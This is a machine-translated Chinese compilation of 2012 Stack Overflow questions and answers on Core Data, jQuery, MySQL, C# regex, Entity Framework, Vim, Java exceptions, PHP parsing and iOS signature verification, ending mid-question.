# StackOverflow 问答 10757000-10757999

# objective-c - 从视图控制器传递后传递的托管对象上下文为空

> ID：10757000
> 
> 赞同：1
> 
> 时间：2012-05-25T15:14:49.920
> 
> 标签：objective-c, ios

我正在尝试做一个简单的核心数据应用程序。我在应用程序委托中有以下代码：

```
#import <UIKit/UIKit.h>

@interface HEFTAppDelegate : UIResponder <UIApplicationDelegate>{

}

@property (strong, nonatomic) UIWindow *window;

@property (strong, nonatomic) NSManagedObjectContext *managedObjectContext;

@end 
```

然后在实现中

```
#import "HEFTAppDelegate.h"
#import "HEFTMasterViewController.h"
#import "HEFTTestdatabaseMasterViewController.h"
#import "HEFTData_Manager.h"

@implementation HEFTAppDelegate

@synthesize window = _window;
@synthesize managedObjectContext = __managedObjectContext;

- (BOOL)application:(UIApplication *)application didFinishLaunchingWithOptions:(NSDictionary *)launchOptions
{
    // Override point for customization after application launch.
    if ([[UIDevice currentDevice] userInterfaceIdiom] == UIUserInterfaceIdiomPad) {

        //ipad init

    } else {
        HEFTTestdatabaseMasterViewController *testDatabaseMasterViewController = [[HEFTTestdatabaseMasterViewController alloc]initWithStyle:UITableViewStylePlain];
        HEFTData_Manager *dataManager = [[HEFTData_Manager alloc]init];

        self.managedObjectContext = [dataManager mainObjectContext];

        // Pass the managed object context to the view controller.

        testDatabaseMasterViewController.managedObjectContext = self.managedObjectContext ;

    }
    return YES;
} 
```

HEFTData_Manager 类设置上下文等

查看调试器，上下文似乎在应用程序委托中正确设置，并且当

```
testDatabaseMasterViewController.managedObjectContext = self.managedObjectContext ; 
```

发出消息。

但是，当表视图出现时 HEFTTestdatabaseMasterViewController managedObjectContext 为 NULL

任何关于正在发生的事情和指点的想法将不胜感激。

## 调试器输出

在：

```
testDatabaseMasterViewController.managedObjectContext = self.managedObjectContext ;

testDatabaseMasterViewController    HEFTTestdatabaseMasterViewController
*   0x06d74b50 UITableViewController    UITableViewController    managedObjectContext   NSManagedObjectContext *    0x06d778e0
fetchedResultsController    NSFetchedResultsController *    0x00000000 
```

在：

```
- (void)viewDidLoad
{
    [super viewDidLoad];

   // NSManagedObjectContext *context = self.managedObjectContext;

    NSLog(@"context : %@",self.managedObjectContext);

    self.navigationItem.leftBarButtonItem = self.editButtonItem;

    UIBarButtonItem *addButton = [[UIBarButtonItem alloc] initWithBarButtonSystemItem:UIBarButtonSystemItemAdd target:self action:@selector(insertNewObject:)];
    self.navigationItem.rightBarButtonItem = addButton;

} 
```

> self HEFTTestdatabaseMasterViewController *const 0x06d705a0 UITableViewController UITableViewController
> UIViewController UIViewController
> _tableViewStyle UITableViewStyle UITableViewStylePlain _keyboardSupport id 0x00000000 _staticDataSource id 0x00000000 _tableViewControllerFlags managedObjectContext NSManagedObjectContext * 0x00000000 fetchedResultsController NSFetchedResultsController

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-25T16:57:56.783

您应该在类的方法中分配您的`managedObjectContext`属性，或者如果这是一个您不应该编辑的库文件，只需将其子类化并将其设置在您的自定义类中。`viewDidLoad``HEFTTestdatabaseMasterViewController``viewDidLoad`

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-26T14:54:51.897

添加：

id appDelegate = (id)[[UIApplication sharedApplication] delegate]; self.managedObjectContext = [appDelegate managedObjectContext];

到 HEFTTestDatabaseMasterVIewController 的 viewDidLoad 方法

工作并且还将在需要访问 managedObjectContext 的其他类中工作

# jquery - 从 h3 元素获取文本而不从 h3 的子元素获取文本

> ID：10757001
> 
> 赞同：0
> 
> 时间：2012-05-25T15:14:58.517
> 
> 标签：jquery

这是我想要的：

```
<h3 class="ExpressCheckoutTitle">
            <a onclick="" href="#" class="ChangeLink">Modify »</a>
            Step 4: Order Confirmation
  </h3> 
```

我只想得到文本“第 4 步：订单确认”

`$('h3.ExpressCheckoutTitle').text()` 给我来自`<a>`元素的文本，如下所示：“修改 >> 步骤 4：订单确认”

我如何在 jquery 中做到这一点？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-25T15:24:00.417

您可以使用`contents()`直接访问 textNodes。试试这个：

```
var text = $("h3").contents().filter(function() {
    return this.nodeType == 3;
}); 
```

[**示例小提琴**](http://jsfiddle.net/RoryMcCrossan/N2rR4/)

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-05-25T15:23:36.250

我会使用`.contents`和过滤`nodeType == 3`。看

```
var h3Text = $('h3.ExpressCheckoutTitle').contents().filter(function() {
   return this.nodeType == 3
}).text();

alert($.trim(h3Text)); 
```

[**演示**](http://jsfiddle.net/4Sn4B/2/)

**编辑：**使用 $.trim 删除尾随空格后更新.. 并正确使用过滤器

# mysql - mysql为每个关系选择最高记录

> ID：10757002
> 
> 赞同：0
> 
> 时间：2012-05-25T15:14:59.120
> 
> 标签：mysql

我有一个包含以下数据的表：

```
=========================================
| name        |  version   | project_id |
=========================================
| foo         |           1|           1|
| new foo     |           2|           1|
| bar         |           1|           2|
========================================= 
```

如何编写返回每个产品的最高版本记录的查询？从上表中，我想要以下结果：

```
=========================================
| name        |  version   | project_id |
=========================================
| new foo     |           2|           1|
| bar         |           1|           2|
========================================= 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-25T15:17:16.957

测试台

![在此处输入图像描述](../Images/cffa783ce4fb3c10390c8dfccd18da25.png)

查询

![在此处输入图像描述](../Images/3c8ae6d3182ff9c1345bae57d9c74652.png)

结果

![在此处输入图像描述](../Images/523d396d5f8c13a3486c0fa3812c970d.png)

赢得我的朋友:)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-25T15:19:50.540

```
SELECT
  t1.name, t1.version, t1.project_id
FROM
  tablename t1
JOIN
  (SELECT max(version) as version, project_id FROM tablename GROUP BY project_id) t2
ON t1.project_id = t2.project_id AND t1.version = t2.version 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-25T20:44:23.057

一个非常简单的方法如下所示

```
select substring_index(group_concat(`name` order by version),',',-1) as `name`,
max(version) as version,project_id 
from your_table 
group by project_id 
order by projec`t_id; 
```

# c# - 验证文件的文本是否匹配某种格式

> ID：10757003
> 
> 赞同：1
> 
> 时间：2012-05-25T15:15:13.897
> 
> 标签：c#, text, verification

我需要验证文件的文本是否包含以下格式的文本：

`#0
DIRECTION: FORWARD
SPEED: 10
TIME: 10`

或者

`#1
DIRECTION: REVERSE
SPEED: 10
ROTATIONS: 10`

这将通过多个步骤重复。

where`#`后面必须跟一个数字，`DIRECTION`后面必须跟`FORWARD`or `REVERSE`，`SPEED`后面必须跟一个数字，最后一行是`TIME`or`ROTATIONS`后面跟一个数字。

在开始读取值之前，我想验证文件是否包含这种格式的文本，而不是一些奇怪的值。
我可以使用某种类型的通配符吗？我已经开始研究 Regex，但我之前没有使用过它。
我想做的是在数字是通配符的情况下进行某种类型的比较，这样我就知道这些行是否包含基本格式：

```
if(fileLines[0].Matches("#%")) // Where % would be the wildcard?  
if(fileLines[1].Matches("DIRECTION:%")) // Does something like this exist? 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-25T15:49:03.630

这种模式似乎有效

```
 string[] lines = 
    {
        "#0",
        "DIRECTION: FORWARD",
        "SPEED: 10",
        "TIME: 10"
    };

      // meaning At start of line there is a # followed by digits till the end of line
    if(checkLine(@"^#\d+$", lines[0]) == false)
        Console.WriteLine("False on line 1");
    else
        Console.WriteLine("True on line 1");

      // meaning At start of line there is the word DIRECTION: followed by space and the words REVERSE or FORWARD
    if(checkLine(@"^DIRECTION: (REVERSE|FORWARD)", lines[1]) == false)
        Console.WriteLine("False on line 2");
    else
        Console.WriteLine("True on line 2");

      // meaning At start of line there is the word SPEED: followed by a space and digits till the end of the line
    if(checkLine(@"^SPEED: \d+$", lines[2]) == false)
        Console.WriteLine("False on line 3");
    else
        Console.WriteLine("True on line 3");

      // meaning At start of line there are the words TIME or ROTATIONS followed by colon, space and digits till the end of the line
    if(checkLine(@"^(TIME|ROTATIONS): \d+$", lines[3]) == false)
        Console.WriteLine("False on line 4");
    else
        Console.WriteLine("True on line 4");
}

// Define other methods and classes here
private bool checkLine(string regExp, string line)
{
    Regex r = new Regex(regExp);
    return r.IsMatch(line);
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-25T16:11:50.370

前提是您已将文件中的所有行作为通用列表阅读。

```
 List<string> fileLines = new List<string>();
        fileLines.Add("#0");
        fileLines.Add("DIRECTION: FORWARD");
        fileLines.Add("SPEED: 10");
        fileLines.Add("TIME: 10");
        fileLines.Add("#1");
        fileLines.Add("DIRECTION: REVERSE");
        fileLines.Add("SPEED: 10");
        fileLines.Add("ROTATIONS: 10"); 
```

使用此功能验证文件是否有效

**信用：Steve 用于正则表达式的实施**

```
 public bool CheckConsistancy(List<string> fileLines)
    {
        bool status = false;
        if (fileLines != null && fileLines.Count > 0)
        {
            if(fileLines.Count % 4 == 0)
            {
                List<List<string>> fileLineGroups = fileLines.Select((x, i) => new { Index = i, Value = x }).GroupBy(x => x.Index / 4).Select(x => x.Select(v => v.Value).ToList()).ToList();
                foreach (List<string> fileLineGroup in fileLineGroups)
                {
                    if (checkLine(@"^#\d", fileLineGroup[0])) 
                    {
                        if (checkLine(@"^DIRECTION: (REVERSE|FORWARD)", fileLineGroup[1]))
                        {
                            if (checkLine(@"^SPEED: \d", fileLineGroup[2]))
                            {
                                if (checkLine(@"^(TIME|ROTATIONS): \d", fileLineGroup[3]))
                                {
                                    status = true;
                                }
                                else
                                {
                                    status = false;
                                    break;
                                }
                            }
                            else
                            {
                                status = false;
                                break;
                            }
                        }
                        else
                        {
                            status = false;
                            break;
                        }
                    }
                    else
                    {
                        status = false;
                        break;
                    }
                }
            }
            else
            {
                status = false;
            }
        }
        return status;
    }

    private bool checkLine(string regExp, string line)
    {
        Regex r = new Regex(regExp);
        return r.IsMatch(line);
    } 
```

调用函数检查一致性

```
bool status = CheckConsistancy(fileLines); 
```

# zend-framework - 如何创建 Zend_Db_Table 模型

> ID：10757014
> 
> 赞同：0
> 
> 时间：2012-05-25T15:15:58.580
> 
> 标签：zend-framework, model

嗨伙计们，

我有一个小问题，我无法解决它。所以，我有这个表，叫做 epg_live_channels，我需要创建一个 Db 表模型。我输入了：zf create db-table EpgLiveChannels epg_live_channels，我得到这个错误：找不到模型目录。

任何想法？

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-25T16:59:50.340

您没有使用模块吗？您在项目文件夹中使用此命令吗？

完整命令：

```
 zf create db-table name actual-table-name module force-overwrite 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-26T06:48:00.667

我在这里猜测，但是当您构建这个应用程序时，您可能没有使用 Zend_Tool 构建它（您没有使用命令行来构建项目）。可能发生的情况是*.zfproject.xml*文件具有您的目录结构的条目或不存在（或只是以某种方式损坏）。
如果这听起来很熟悉，您应该能够通过创建一个空白项目然后将*.zfproject.xml*复制到现有项目来解决此问题。

# c# - 实体框架初始化很慢——我能做些什么来更快地引导它？

> ID：10757019
> 
> 赞同：37
> 
> 时间：2012-05-25T15:16:13.243
> 
> 标签：c#, performance, entity-framework-4, entity-framework-4.3

我的 EF 4.3.1 模型有 200 多个表。初始启动很糟糕，几分钟。DotTrace 捕获的配置文件暗示了框架深处的一些糟糕的算法/可扩展性选择，这可以从那里对许多方法的数百万次调用和 3600 万次 IEnumerable.Contains() 调用证明。这是一个片段，这都是由在数据库上完成的第一个查询触发的（未来的查询不会这样做并且很好）。

![在此处输入图像描述](../Images/c19c09ce1e66115e1af00f1ff15a9cb1.png)

我可以对我的模型做些什么来减轻这种痛苦？我可以以某种方式预编译它吗？更好的是，EF 团队能否解决这些问题或开源框架以便我可以？或者至少修复`Warapper`? :)

编辑：触发此事件的一个特定 EF 调用基本上是`var db = new MyDbContext(); db.Personnel.Where(a => a.Login == login).SingleOrDefault();`. EF Migrations Seed() AddOrUpdate 也有效地生成相同的堆栈。更完整的堆栈跟踪，可能会提供更多上下文，在这里：[Fuller Stack Trace](https://i.stack.imgur.com/BH9v8.png)

编辑：一些相关链接：

*   MSDN：[性能注意事项（实体框架）](http://msdn.microsoft.com/en-us/library/cc853327%28v=vs.110%29.aspx)（感谢@AakashM）
*   MSDN：[英孚电动工具](http://blogs.msdn.com/b/adonet/archive/2011/05/18/ef-power-tools-ctp1-released.aspx)
*   SO：[用于大量表的实体框架 4.1 (715)](https://stackoverflow.com/questions/6185918/entity-framework-4-1-for-large-number-of-tables-715)

EDIT2：现在他们刚刚[开源](http://entityframework.codeplex.com/)了代码，看来这一行：

```
//Filter the 1:1 foreign key associations to the ones relating the sets used in these cell wrappers.
oneToOneForeignKeyAssociationsForThisWrapper =
    oneToOneForeignKeyAssociationsForThisWrapper.Where(
        it => (it.AssociationEndMembers.All(endMember => entityTypes.Contains(endMember.GetEntityType())))); 
```

是需要一些工作的人。它可能不需要使用 O(n^2) 算法，但我还没有仔细观察。

EDIT3：令人高兴的是，EF6 中的工作似乎正在修复此代码：[http ://entityframework.codeplex.com/discussions/396130](http://entityframework.codeplex.com/discussions/396130)

* * *

## 回答 #1

> 赞同：23
> 
> 时间：2012-05-25T16:06:09.490

在 EF6 之前，对于较大的模型，视图生成速度较慢。目前的解决方案是使用预生成的视图。这样，您可以在设计时生成视图并在运行时避免这项工作。为此，请下载 EF 电动工具并选择“优化实体数据模型”。它将向您的项目添加一个包含视图的 C# 文件。不利的一面是，每次模型更改时都需要这样做。注意：使用该工具生成视图所花费的时间与在运行时生成视图所花费的时间大致相同（因此有时您需要耐心等待）。这是一篇关于 EF Power Tools 的帖子，可能会有所帮助：http: [//blogs.msdn.com/b/adonet/archive/2011/05/18/ef-power-tools-ctp1-released.aspx](http://blogs.msdn.com/b/adonet/archive/2011/05/18/ef-power-tools-ctp1-released.aspx)

**编辑**

最近我创建了一个更方便使用的不同解决方案（注意它仅适用于 EF6）- [http://blog.3d-logic.com/2013/12/14/using-pre-generated-views-without-必须预先生成视图-ef6/](http://blog.3d-logic.com/2013/12/14/using-pre-generated-views-without-having-to-pre-generate-views-ef6/)

* * *

## 回答 #2

> 赞同：12
> 
> 时间：2012-05-26T22:47:16.390

这是另一种方法。它需要一些手动工作，但实际上更适合您想要使用 MsBuild 的场景。您可以手动创建它们，而不是使用 Power Tools 创建视图（我很遗憾听到它们不适合您） - 以下是步骤：

*   首先，您需要为您的上下文获取工件。您需要所有 - csdl、ssdl 和 msl 文件。您可以使用 EdmxWriter 来获取这些内容。请注意，EdmxWriter 返回一个结合了所有三个文件的 edmx 文件，因此您需要拆分它们。这是此步骤的代码（请注意，命名空间特定于 EF4，如果您正在考虑使用 EF5 和 .NET Framework 4.5，则需要相应地更改它们或仅按本地名称而不是完全限定名称选择元素）：

```
 var ms = new MemoryStream();
    using (var writer = XmlWriter.Create(ms))
    {
        EdmxWriter.WriteEdmx(new Context(), writer);
    }

    ms.Position = 0;

    var xDoc = XDocument.Load(ms);

    var ssdl = xDoc.Descendants("{http://schemas.microsoft.com/ado/2009/02/edm/ssdl}Schema").Single();
    var csdl = xDoc.Descendants("{http://schemas.microsoft.com/ado/2008/09/edm}Schema").Single();
    var msl = xDoc.Descendants("{http://schemas.microsoft.com/ado/2008/09/mapping/cs}Mapping").Single();

    ssdl.Save("Context.ssdl");
    csdl.Save("Context.csdl");
    msl.Save("Context.msl"); 
```

*   当您有工件时，您可以使用 EdmGen 工具生成视图。由于这里我们手动进行，您需要在 VS 命令提示符下进行。这是用于生成视图的命令：

```
EdmGen /mode:ViewGeneration /incsdl:Context.csdl  /inmsl:Context.msl /inssdl:Context.ssdl /outviews:Context.Views.cs
```

*   将生成的文件添加到您的项目中。

如果您想将视图生成与构建系统集成，还有一个更有趣的选项 - 使用 T4 模板。该模板将处理上述步骤。您可以在此处找到有关此方法的更多详细信息[http://blogs.msdn.com/b/adonet/archive/2008/06/20/how-to-use-a-t4-template-for-view-generation.aspx](http://blogs.msdn.com/b/adonet/archive/2008/06/20/how-to-use-a-t4-template-for-view-generation.aspx) . 唯一的问题是该示例不适用于 CodeFirst 方法，因此需要稍作更改，这应该不难。

我实际上为 Code First 创建了 T4 模板。您可以在我的博文中找到下载链接：http: [//blog.3d-logic.com/2012/05/28/entity-framework-code-first-and-pre-generated-views/](http://blog.3d-logic.com/2012/05/28/entity-framework-code-first-and-pre-generated-views/)

这些模板现在可在 Visual Studio 代码库中使用。这是包含所有详细信息的帖子的链接：http: [//blog.3d-logic.com/2012/06/13/entity-framework-codefirst-view-generation-templates-on-visual-studio-code-画廊/](http://blog.3d-logic.com/2012/06/13/entity-framework-codefirst-view-generation-templates-on-visual-studio-code-gallery/)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2014-09-15T10:04:32.983

在当前版本的 Entity Framework 中，视图生成实际上相当快。(6.1) 还有另一种更广泛的缓存解决方案正在准备中：[https](https://entityframework.codeplex.com/workitem/1876) ://entityframework.codeplex.com/workitem/1876 。你可以等待这个补丁被接受，或者，如果你足够勇敢，你可以自己申请。

# vim - 使用 CTRL-C 而不是 ESC 时，Vim InsertLeave 事件不会发生

> ID：10757020
> 
> 赞同：10
> 
> 时间：2012-05-25T15:16:18.827
> 
> 标签：vim

我正在阅读 Steve Losh 的[Learn Vimscript the Hard Way](http://learnvimscriptthehardway.stevelosh.com/)并已添加到我的 .vimrc

```
" make status line red while in insert mode
augroup hi_statusline
  autocmd!
  autocmd InsertEnter * hi StatusLine ctermbg=15  ctermfg=9
  autocmd InsertLeave * hi StatusLine ctermbg=238 ctermfg=253
augroup END 
```

然而，我注意到一个奇怪的行为。有时我`C-c`会退出插入模式，该模式运行良好并已记录在案。当我这样做时，不会触发 InsertLeave 事件。当我使用它时`ESC`，它工作正常。这是 vim 的一个已知奇怪之处吗？是否有解决方法，通过挂钩另一个表明 InsertMode 不再活动的事件？

编辑 | 嗯，添加 a`inoremap <C-c> <ESC>`解决了它，据我所知绝对没有副作用，因为 Cc 已经做了 ESC 所做的事情（回到正常模式）。如我错了请纠正我。

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2012-05-25T15:25:09.770

```
:ino <C-C> <Esc> 
```

^C 通常是让我离开这里的键，如果你有一个自动命令，你不需要运行 CC 成为你的朋友。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-12-23T22:49:24.630

这记录在`:help i_CTRL-C`：

```
CTRL-C  Quit insert mode, go back to Normal mode.  Do not check for
        abbreviations.  Does not trigger the |InsertLeave| autocommand
        event. 
```

像往常一样，布拉姆不辜负设计目标。

```
:help design-documented 
```

# java - 如何告诉 Java 编译器不要抱怨某些异常没有被捕获或抛出？

> ID：10757024
> 
> 赞同：3
> 
> 时间：2012-05-25T15:16:28.857
> 
> 标签：java, exception

如果我 100% 确定该异常永远不会发生，有没有办法告诉 Java 编译器不要抱怨某个异常没有被捕获或抛出？

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-05-25T15:18:37.997

假设你的意思是检查异常，你不能。通常我会捕获异常，但将其传播到 a`RuntimeException`中，例如

```
try {
   // Do something which could, but won't, throw SomeCheckedException
} catch (SomeCheckedException e) {
   throw new WorldHasGoneMadException(e);
} 
```

您可能很想为这种场景创建一个*特定*`WorldHasGoneMadException`的例外 - 虽然我不建议使用真实姓名，但类似的东西是合适的。这不仅仅是“发生了意想不到的事情”，而是“哇，我敢打赌，这*真的，真的*不可能发生”。

哦，当然您的单元测试*不会*涵盖这种情况。忍受它:)

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-05-25T15:30:51.367

我认为[乔恩的回答](https://stackoverflow.com/a/10757058/348975)非常好，但我希望`assert`已经有这样的`WorldHasGoneMadException`课程，因此您无需为它创建特定的例外。

```
try {
   // Do something which could, but won't, throw SomeCheckedException
} catch (SomeCheckedException e) {
   assert false : e ;
} 
```

在启用断言的情况下运行测试。如果你得到一些 AssertionErrors，你就知道你的假设有问题。在生产过程中，违反您的假设（您确实对其进行了彻底的测试，因此不会有违反，对吧？）将被默默地吞下。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-05-25T15:23:35.577

如果有一个设置，我很确定没有，我不建议使用它。

我通常在调试“发生”的生产错误时遇到那些“永远不会发生”的事件。;-) 至少我会建议尝试/捕获并记录一些错误级别，以便至少在实际发生的奇怪情况下让您意识到问题。

希望这可以帮助。

# php - 正则表达式提取

> ID：10757028
> 
> 赞同：1
> 
> 时间：2012-05-25T15:16:53.103
> 
> 标签：php, regex

我一直在尝试在字符串中提取一些东西。我得到了以下字符串：

`*, bob, DATE('gdfgfd', 'Fdsfds', ('fdsfdfsd')), george`

我想在 () 之外用逗号提取，它应该是这样的：

*   *
*   鲍勃
*   日期（'gdfgfd'，'Fdsfds'，（'fdsfdfsd'））
*   乔治

我一直在尝试使用explode，但它甚至在函数内部（和）......逻辑中被函数的意思。

所以我这样做了：`[^(,\s]+|\([^)]+\)`但即使在括号内找到逗号，它也会给cut。

任何人都知道该怎么做我的意思？

谢谢

编辑 ：

好的，非常清楚和直接。

我懂了 ：`SELECT MyField, Field2, Blabla, Function(param), etc FROM table Blabla`

我已经得到了字符串`MyField, Field2, Blabla, Function(param), etc`，因为查询是由多个函数类完成的，`$DB->Select('MyField, Field2, Blabla, Function(param), etc');`但现在我想解析逗号之间的所有内容，所以`MyField, Field2, Blabla, Function(param), etc`变成这样：

*   我的领域
*   字段2
*   布拉布拉
*   函数（参数）
*   ETC

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-25T15:50:48.843

将此作为答案发布，因为它可能比其他任何东西都好：

[http://code.google.com/p/php-sql-parser/](http://code.google.com/p/php-sql-parser/)

使用该项目来解析您的 SQL 语句。结果以数组的形式返回，包括中间的位`SELECT`和`FROM`单独的元素，就像你想要的那样。这将比您使用的任何正则表达式解决方案好得多。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-05-25T15:55:08.933

这是我做的，不支持多字节字符：

编辑：添加字符串意识

```
<?php

$stack = array();
$stuff = array();

$escaping = false;
$input = "*, bob, [], DATE('g()d\\'f,gfd', ('Fd()sf)ds'), ('fdsfd\"\"()fsd')), ',(),() (,,'";
$len = strlen( $input );
$i = 0;
$curstr = "";
$char;

while( $i < $len ) {
    $char = $input[$i++];

    if( $escaping ) {
        $curstr .= $char;
        $escaping = false;
        continue;
    }

    switch( $char ) {

        case "\\":
            $escaping = true;
            break;

        case '"':
            $top = end( $stack );
            if( $top === '"' ) {
                array_pop( $stack );
            }
            else if( $top !== "'" ){
                $stack[] = '"';
            }

            $curstr .= $char;
            break;

        case "'":
            $top = end( $stack );
            if( $top === "'" ) {
                array_pop( $stack );
            }
            else if( $top !== '"' ) {
                $stack[] = "'";
            }

            $curstr .= $char;           
            break;

        case ",":
            if( count( $stack ) ) {
                $curstr .= $char;
            }
            else {
                $stuff[] = trim($curstr);
                $curstr = "";
            }
            break;

        case "(":
            $top = end( $stack );
            if( $top !== "'" && $top !== '"' ) {
                $stack[] = "(";                   
            }

            $curstr .= $char;
            break;

        case ")":
            $top = end( $stack );

            if( $top !== "'" && $top !== '"' ) {
                if( end($stack) !== "(" ) {
                    die( "Unbalanced parentheses" );
                }
                array_pop( $stack );
            }

            $curstr .= $char;

            break;

        default:
            $curstr .= $char;
            break;

    }
}

if( count( $stack ) ) {
    die( "Unbalanced ".end($stack) );
}

$stuff[] = trim( $curstr );

print_r( $stuff );

/*
    Array
(
    [0] => *
    [1] => bob
    [2] => []
    [3] => DATE('g()d'f,gfd', ('Fd()sf)ds'), ('fdsfd""()fsd'))
    [4] => ',(),() (,,'
)

*/ 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-25T15:47:31.450

您可以使用此基于正则表达式的代码以您想要的方式获取拆分结果：

```
$str = "*, bob, DATE('gdfgfd', 'Fdsfds', ('fdsfdfsd')), george";
$arr = preg_split('/([^,]*(?:\([^)]*\))[^,]*)+|,/', $str, -1,
                      PREG_SPLIT_DELIM_CAPTURE | PREG_SPLIT_NO_EMPTY); 
```

### 更新：

尽管我的原始答案适用于 OP 发布的示例，但由于一些成员提出的担忧，我发布了一个解决方案，该解决方案将与嵌套括号一起使用，并且**只要括号是平衡的：**

```
$str = "*, bob, DATE('gdfgfd', ('Fdsfds'), ('fdsfdfsd', ('foo'))) 'foo'=[bar]," .
       "john, MY('gdfgfd', ((('Fdsfds'))), ('fdsfdfsd')), george";
$arr = preg_split('/\s*( [^,()]* \( ( [^()]* | (?R) )* \) [^,()]* ) ,?\s* | \s*,\s*/x',
                  $str, -1 , PREG_SPLIT_DELIM_CAPTURE | PREG_SPLIT_NO_EMPTY);
print_r($arr); 
```

**输出：**

```
Array
(
    [0] => *
    [1] => bob
    [2] => DATE('gdfgfd', ('Fdsfds'), ('fdsfdfsd', ('foo'))) 'foo'=[bar]
    [3] => john
    [4] => MY('gdfgfd', ((('Fdsfds'))), ('fdsfdfsd'))
    [5] => george
) 
```

警告：尽管这种基于递归的正则表达式模式现在适用于深层嵌套括号，但这并不意味着在某些极端情况下（如不平衡括号）不能破坏它。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-05-25T15:31:15.483

您在评论中声明您准备使用递归，因为您有嵌套列表。但是，**正则表达式不能进行递归**。这是因为正则表达式不能无限期地“计算”任何东西。由于它无法计算开/关括号，它无法知道其中有多少层，或者它必须去多少层。

您可以编写极其复​​杂的正则表达式来处理 N 级深度（请参阅[anubhava 的答案](https://stackoverflow.com/a/10757504/343238)），但是一旦您遇到具有 N+1 级深度的表达式，您的正则表达式就会失败。这就是为什么我们使用编程语言来解析不规则语言的原因，因为它们可以计算递归（参见[diolemo 的回答](https://stackoverflow.com/a/10757468/343238)）。*在*这个递归中，我们可以使用少量的正则表达式。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-05-25T15:45:30.183

这将起作用（在大多数情况下）。如果引号内有括号（数据的一部分），它将失败。如果你愿意，你可以扩展代码来处理带引号的括号（但是你必须考虑转义引号和类似的东西。正则表达式永远不会很好用。

**编辑：最好使用 SpikeX 回答的 PHP SQL Parser。**

```
function unreliable_comma_explode($str)
{
   $last_split = 0;
   $len = strlen($str);
   $brackets = 0;
   $parts = array();

   for ($i = 0; $i < $len; $i++)
   {
      if ($str[$i] == '(') 
      {
         $brackets++;
         continue;
      }

      if ($str[$i] == ')')
      {
         if (--$brackets == -1) $brackets = 0;
         continue;
      }

      if ($str[$i] == ',' && $brackets == 0)
      {
         $parts[] = substr($str, $last_split, ($i-$last_split));
         $last_split = $i + 1;
      }
   }

   if (($len-$last_split) > 0)
      $parts[] = substr($str, $last_split, ($len-$last_split));

   return $parts;
} 
```

* * *

## 回答 #6

> 赞同：-1
> 
> 时间：2012-05-25T15:39:30.097

我不太确定你想在这里做什么。但如果你只是想提取字符串。你可以只使用内爆。

```
$array = array("*", "bob", "DATE('gdfgfd', 'Fdsfds', '(\"fdsfdfsd\"))", "george");
echo $test = implode($array, ","); 
```

# ios - SecKeyRawVerify 和 OSError -9809

> ID：10757033
> 
> 赞同：7
> 
> 时间：2012-05-25T15:17:03.367
> 
> 标签：ios, objective-c, security-framework

我正在使用数字证书对我的应用程序中的数据文件进行签名。当调用`SecKeyRawVerify`返回 -9809 时，下面的代码片段失败。这是在 iPhone 上运行的。我什至无法准确识别此错误代码的含义

先前的安全框架调用来加载和创建从中获取公钥的 SecTrustRef 似乎很好 - 没有错误。唯一的小问题是调用`SecTrustEvaluate`返回 a `kSecTrustResultUnspecified`，但我认为这是因为我使用的策略是`SecPolicyCreateBasicX509`调用返回的样板文件。

任何帮助或见解将不胜感激。

谢谢

```
SecKeyRef keyRef = SecTrustCopyPublicKey (trustRef);

fileURL = [[NSBundle mainBundle] URLForResource:@"data" withExtension:@"txt"];
NSData *data = [NSData dataWithContentsOfURL:fileURL];

fileURL = [[NSBundle mainBundle] URLForResource:@"data" withExtension:@"sgn"];
NSData *signature = [NSData dataWithContentsOfURL:fileURL];

NSLog(@"Hash block size = %zu",SecKeyGetBlockSize(keyRef));

status = SecKeyRawVerify (keyRef,
                          kSecPaddingPKCS1SHA1,
                          (const uint8_t *)[data bytes],
                          (size_t)[data length],
                          (const uint8_t *)[signature bytes],
                          (size_t)[signature length]
                          ); 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-26T01:58:36.987

`/System/Library/Frameworks/Security.framework/Headers/SecureTransport.h`该错误在as中定义（以及其他相关错误）`errSSLCrypto`。那里的评论称其为“潜在的密码错误”，这不是一个特别描述性的描述。

一种想法：`kSecTrustResultUnspecified`意味着信任级别等于默认系统策略。链中的所有证书都受信任吗？

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-05-27T07:30:09.367

我发现了发生了什么。该`SecKeyRawVerify`调用将您的数据摘要作为输入，而不是数据本身。下面的代码有效 - 顺便说一句，如果由于基础数据已更改而未验证签名，则状态返回为 -9809。

谢谢

```
CC_SHA1((const void *)[data bytes], [data length], (unsigned char *)hash);

status = SecKeyRawVerify (keyRef,
                          kSecPaddingPKCS1SHA1,
                          hash,
                          20,
                          (const uint8_t *)[signature bytes],
                          SecKeyGetBlockSize(keyRef)
                          ); 
```

# view - 在 Mono for Droid 中将侦听器附加到视图

> ID：10757035
> 
> 赞同：2
> 
> 时间：2012-05-25T15:17:09.140
> 
> 标签：view, mono, listener, xamarin.android

希望有人可以提供帮助。

我正在尝试将 OnTouchListener() 附加到视图并且它是子视图。在原生 android 中，这将使用 setOnTouchListener() 方法。

[Xamarin 文档](http://docs.xamarin.com/ios/advanced_topics/events)似乎建议对 c# 使用委托。但这似乎行不通。任何人都可以帮助进行关于将 ontouch 侦听器附加到视图及其子项的基本演示。

下面是我尝试过的代码。

```
 myView.Touch += (sender,e)=>
    {
        // Code to be executed
    } 
```

和

```
 myView.Click += (sender,e)=>
    {
